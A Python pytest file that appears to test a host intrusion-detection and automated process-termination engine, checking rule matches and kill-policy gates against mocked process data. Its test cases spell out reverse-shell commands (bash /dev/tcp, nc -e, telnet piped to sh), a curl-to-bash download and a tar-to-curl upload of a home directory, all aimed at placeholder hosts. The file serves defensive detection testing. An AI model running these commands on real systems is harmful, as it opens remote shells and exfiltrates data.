"""Three real YAML rules with synthetic sensors and fake signal primitives only.

Üç gerçek YAML kuralı; yalnız sentetik sensörler ve sahte sinyal ilkelleri.
"""
import copy
import json
import signal
import time
from types import SimpleNamespace
from unittest.mock import Mock
import pytest
from satsuma.store import Store
from satsuma.worker_sys_proc import WorkerSysProc
from satsuma.pipeline import Pipeline
from satsuma.smart_rules import SmartRuleEngine
from satsuma.auto_action import AutoActionEngine
from satsuma.response import ResponseWorker
from satsuma import process_identity as identity, response as response_module
from satsuma.presentation import action_view
from run_satsuma_teams import _smart_event

CASES=[('SATSUMA-EXEC-001','bash -i >& /dev/tcp/203.0.113.9/4444 0>&1','/usr/bin/bash'),
       ('SATSUMA-EXEC-007','nc -e /bin/bash 203.0.113.9 4444','/usr/bin/nc'),
       ('SATSUMA-EXEC-009','curl https://example.invalid/maintenance.sh | bash','/usr/bin/bash')]
EXPECTED={'SATSUMA-EXEC-001':('SATSUMA-C2-001','likely'),
          'SATSUMA-EXEC-007':('SATSUMA-C2-001','likely'),
          'SATSUMA-EXEC-009':('SATSUMA-EXEC-009','suspicious')}
PID=424242


@pytest.fixture
def harness(tmp_path,monkeypatch,request):
    store=Store(tmp_path/'data',test=True)
    # Actual identity comparator with a synthetic /proc view; no real target.
    state={'start':1234,'exe':'/usr/bin/bash','comm':'fixture','signals':[], 'poll_exit':True,'deny_signal':False}
    monkeypatch.setattr(identity,'read_proc_starttime',lambda pid:state['start'])
    monkeypatch.setattr(identity,'read_proc_exe',lambda pid:state['exe'])
    monkeypatch.setattr(identity,'read_proc_comm',lambda pid:state['comm'])
    monkeypatch.setattr(identity,'read_proc_cmdline',lambda pid:'fixture')
    monkeypatch.setattr('satsuma.trusted_process.system_service',lambda *a,**k:'')
    def send(fd,number,*a):
        assert fd==987654321
        if state['deny_signal']:raise PermissionError('synthetic signal permission denied')
        state['signals'].append(int(number))
    monkeypatch.setattr(response_module.signal,'pidfd_send_signal',send)
    monkeypatch.setattr(response_module.os,'pidfd_open',lambda pid:987654321)
    original_close=response_module.os.close
    monkeypatch.setattr(response_module.os,'close',lambda fd:None if fd==987654321 else original_close(fd))
    class Poll:
        def register(self,fd,*a):assert fd==987654321
        def poll(self,*a):return [(987654321,1)] if state['poll_exit'] else []
    monkeypatch.setattr(response_module.select,'poll',Poll)
    # runner prevents privd delegation; it is never called for process primitives.
    runner=Mock(side_effect=AssertionError('No external command allowed'))
    worker=ResponseWorker(store,{'response_enabled':True},runner=runner)
    config={'response_enabled':True,'destructive_response_enabled':True,
            'destructive_allowed_actions':['process_kill'],'auto_action_process_enabled':True}
    yield store,state,worker,config
    request.node.user_properties.append(('fake_signal_calls',json.dumps(state['signals'])))
    request.node.user_properties.append(('intervention_latest',json.dumps(store.get('rule_intervention_latest',{}))))
    runner.assert_not_called();store.close()


def finding(store,rule_id,cmd,exe,*,age=0):
    sensor=WorkerSysProc(store)
    raw={'processes':{PID:{'cmd':cmd,'exe':exe,'uid':1000,'ppid':200,'starttime_jiffies':1234}},
         'modules':[],'usb':[],'ports':[],'kernel_taint':0}
    event=next(e for e in sensor._raw_to_events(raw) if e['kind']=='process')
    if age:event['timestamp']=time.time()-age
    pipeline=object.__new__(Pipeline);pipeline.store=store;pipeline.events=0
    pipeline.ingest_host(event)
    row=store.db.execute("SELECT id,body FROM records WHERE kind='normalized' ORDER BY id DESC LIMIT 1").fetchone()
    mapped=_smart_event(row[0],row[1])
    assert mapped['pid']==PID and mapped['starttime']==1234 and mapped['exe']==exe
    matches=SmartRuleEngine().match(mapped)
    return next((f for f in matches if f['rule_id']==rule_id or rule_id in f.get('matched_rules',[])),None)


def process(harness,rid,cmd,exe,**kwargs):
    store,state,worker,config=harness
    state['exe']=exe
    detected=finding(store,rid,cmd,exe,**kwargs)
    assert detected is not None
    result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
    return detected,result


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_detection_without_yaml_kill_reaches_central_policy_and_fake_exit(harness,rid,cmd,exe):
    detected,result=process(harness,rid,cmd,exe)
    assert (detected['rule_id'],detected['classification'])==EXPECTED[rid]
    assert detected['severity']=='critical'
    assert 'process_kill' not in detected['actions']
    assert result['signal_sent'] and result['exit_verified']
    assert harness[1]['signals']==[signal.SIGTERM]
    assert harness[0].get('rule_intervention_latest')[detected['rule_id']]['exit_verified']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_normal_event_does_not_match(harness,rid,cmd,exe):
    assert finding(harness[0],rid,'bash -c "printf maintenance"',exe) is None
    assert not harness[1]['signals']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_authorized_maintenance_label_is_not_a_security_exemption(harness,rid,cmd,exe):
    store,state,worker,config=harness;state['exe']=exe
    detected=finding(store,rid,cmd,exe);assert detected
    detected['event']['authorized_maintenance']=True
    result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
    assert result['signal_sent']  # Characterizes a false-positive policy risk, not malware proof.
    assert detected['classification']==EXPECTED[rid][1]


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_missing_independent_evidence_blocks_policy(harness,rid,cmd,exe):
    harness[0].set('rule_response_requirements',{rid:{'minimum_sources':2,'freshness_seconds':60}})
    _,result=process(harness,rid,cmd,exe)
    assert result['status']=='policy_denied' and not result['signal_sent']
    assert 'insufficient_independent_fresh_same_target_evidence' in result['reasons']
    assert not harness[1]['signals']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
@pytest.mark.parametrize('change',['stale','pid_reuse','executable_changed','protected','policy_denied','missing_start'])
def test_rejected_context_never_signals(harness,rid,cmd,exe,change,request):
    request_cleanup=[];request.addfinalizer(lambda:[undo() for undo in request_cleanup])
    store,state,worker,config=harness;state['exe']=exe
    detected=finding(store,rid,cmd,exe,age=600 if change=='stale' else 0);assert detected
    if change=='pid_reuse':state['start']=9999
    if change=='executable_changed':state['exe']='/opt/another-program'
    if change=='protected':
        # The exemption itself is unit-tested with a live /proc view (test_enforcement).
        import satsuma.enforcement as enforcement_module
        harness_patch=pytest.MonkeyPatch();harness_patch.setattr(enforcement_module,'exempt',lambda *a,**k:'protected_program:systemd')
        request_cleanup.append(harness_patch.undo)
    if change=='missing_start':
        detected['event'].pop('starttime');detected['event']['metadata']['extensions'].pop('host.starttime')
        detected['event']['raw']['metadata']['extensions'].pop('host.starttime')
        store.set('enforcement_policy',{'enabled':False})
    if change=='policy_denied':
        store.set('enforcement_policy',{'enabled':False});config['auto_action_process_enabled']=False
    result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
    assert not result['signal_sent'] and not state['signals']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_authorized_but_signal_denied_is_not_success(harness,rid,cmd,exe):
    harness[1]['deny_signal']=True
    _,result=process(harness,rid,cmd,exe)
    assert result['status']=='termination_failed' and not result['signal_sent'] and not result['exit_verified']
    rows=harness[0].db.execute("SELECT body FROM records WHERE kind='actions'").fetchall()
    assert any(json.loads(row[0]).get('status')=='process_termination_authorized' for row in rows)
    assert not harness[1]['signals']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_signal_sent_without_exit_is_separate_and_shown_as_pending(harness,rid,cmd,exe):
    harness[1]['poll_exit']=False
    _,result=process(harness,rid,cmd,exe)
    assert result['status']=='termination_pending' and result['signal_sent'] and not result['exit_verified']
    assert harness[1]['signals']==[signal.SIGTERM,signal.SIGKILL]
    assert 'çıkış doğrulanmadı' in action_view(result)['outcome']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_identity_changes_at_last_check_prevent_first_signal(harness,monkeypatch,rid,cmd,exe):
    reads=iter([1234,9999])
    monkeypatch.setattr(identity,'read_proc_starttime',lambda pid:next(reads))
    _,result=process(harness,rid,cmd,exe)
    assert result['status']=='identity_recheck_failed' and not result['signal_sent']
    assert result['result']['stage']=='before_sigterm' and not harness[1]['signals']


@pytest.mark.parametrize('rid,cmd,exe',CASES)
def test_existing_integrity_warning_is_not_a_runtime_response_gate(harness,rid,cmd,exe):
    # A characterization of the verified source, not a proposed security relaxation.
    harness[0].set('integrity_runtime',{'status':'UNTRUSTED'})
    harness[0].set('early_boot',{'response_unlocked':False})
    _,result=process(harness,rid,cmd,exe)
    assert result['signal_sent'] and result['exit_verified']


@pytest.mark.parametrize('mode',['-L','-R','-D'])
def test_single_ssh_tunnel_indicator_is_report_only_even_when_required_is_one(harness,mode):
    store,state,worker,config=harness
    cmd='ssh '+mode+' 1080 admin@example.invalid';state['exe']='/usr/bin/ssh'
    detected=finding(store,'SATSUMA-EXFIL-010',cmd,state['exe']);assert detected
    assert detected['classification']=='indicator' and detected['severity']=='medium'
    from satsuma.rule_response import requirement_for
    assert requirement_for(detected,config,store) is None
    result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
    assert result['status']=='report_only' and 'activity_indicator_reports_only' in result['reasons']
    assert not result['signal_sent'] and not state['signals']


def test_ssh_catalog_recommendation_does_not_activate_two_or_three_source_policy(harness):
    from pathlib import Path
    from satsuma.rule_response import requirement_for
    store,state,worker,config=harness
    entry=next(r for r in json.loads((Path(__file__).parents[1]/'schemas/rule-response-catalog-v1.json').read_text())['rules'] if r['rule_id']=='SATSUMA-EXFIL-010')
    proposal=entry['proposed_response']
    assert proposal['minimum_sources']==2 and proposal['applied'] is False
    assert proposal['required_source_families']==['process','audit','memory']
    detected=finding(store,entry['rule_id'],'ssh -L 1080:localhost:80 admin@example.invalid','/usr/bin/ssh')
    assert requirement_for(detected,config,store) is None
    assert store.get('rule_response_verdicts',{})=={}


def test_ssh_explicit_two_source_policy_cannot_be_satisfied_by_one_indicator(harness):
    store,state,worker,config=harness;state['exe']='/usr/bin/ssh'
    store.set('rule_response_requirements',{'SATSUMA-EXFIL-010':{'minimum_sources':2,'freshness_seconds':60}})
    detected=finding(store,'SATSUMA-EXFIL-010','ssh -D 1080 admin@example.invalid',state['exe'])
    result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
    assert not result['signal_sent'] and not state['signals']
    assert 'insufficient_independent_fresh_same_target_evidence' in result['reasons']
    assert 'activity_indicator_reports_only' in result['reasons']


@pytest.mark.parametrize('rid,cmd,exe',[
    ('SATSUMA-EXFIL-008','base64 /etc/hosts','/usr/bin/base64'),
    ('SATSUMA-EXFIL-009','tar cf - /home/fixture | curl https://example.invalid/backup','/usr/bin/tar')])
def test_base64_and_archive_indicators_do_not_authorize_single_event_termination(harness,rid,cmd,exe):
    store,state,worker,config=harness;state['exe']=exe
    detected=finding(store,rid,cmd,exe);assert detected
    assert detected['classification']=='indicator' and detected['severity']=='medium'
    result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
    assert result['status']=='report_only' and not result['signal_sent'] and not state['signals']


@pytest.mark.parametrize('rid,cmd,exe',CASES[:2])
def test_deduplicated_result_is_keyed_to_primary_rule_not_all_matched_yaml_ids(harness,rid,cmd,exe):
    detected,result=process(harness,rid,cmd,exe)
    assert detected['rule_id']=='SATSUMA-C2-001' and rid in detected['matched_rules']
    outcomes=harness[0].get('rule_intervention_latest')
    assert 'SATSUMA-C2-001' in outcomes and rid not in outcomes


@pytest.mark.parametrize('rid,cmd,exe,expected_signal',[
    ('SATSUMA-EXFIL-006','nc -w 3 203.0.113.9 4444','/usr/bin/nc',True),
    ('SATSUMA-EXEC-010','bash -c "eval printf"','/usr/bin/bash',False),
    ('SATSUMA-EXEC-011','xterm -display 203.0.113.9:0','/usr/bin/xterm',True),
    ('SATSUMA-EXEC-013','telnet 203.0.113.9 4444 | /bin/sh','/usr/bin/telnet',True)])
def test_panel_classification_does_not_replace_named_policy_exceptions(harness,rid,cmd,exe,expected_signal):
    detected,result=process(harness,rid,cmd,exe)
    assert result['signal_sent'] is expected_signal
    assert bool(harness[1]['signals']) is expected_signal


def test_existing_identity_gate_does_not_claim_boot_or_file_digest_verification(harness):
    state=harness[1];state['exe']='/usr/bin/bash'
    result=identity.verify_process_identity(PID,{'pid':PID,'starttime':1234,'exe':'/usr/bin/bash',
        'boot_id':'different-boot','exe_dev':-1,'exe_ino':-1,'file_sha256':'0'*64})
    assert result['ok']  # These optional claims are not checked by this legacy function.
    assert not state['signals']
